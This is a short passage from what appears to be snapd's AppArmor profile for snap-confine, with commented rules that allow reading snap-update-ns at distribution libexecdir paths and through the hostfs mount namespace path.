   602	
   603	    # Allow executing snap-update-ns when...
   604	
   605	    # ...snap-confine is, conceptually, re-executing and uses snap-update-ns
   606	    # from the distribution package. This is also the location used when using
   607	    # the core/base snap on all-snap systems. The variants here represent
   608	    # various locations of libexecdir across distributions.
   609	    /usr/lib{,exec,64}/snapd/snap-update-ns r,
   610	
   611	    # ...snap-confine is not, conceptually, re-executing and uses
   612	    # snap-update-ns from the distribution package but we are already inside
   613	    # the constructed mount namespace so we must traverse "hostfs". The
   614	    # variants here represent various locations of libexecdir across
   615	    # distributions.
   616	    /var/lib/snapd/hostfs/usr/lib{,exec,64}/snapd/snap-update-ns r,
   617	
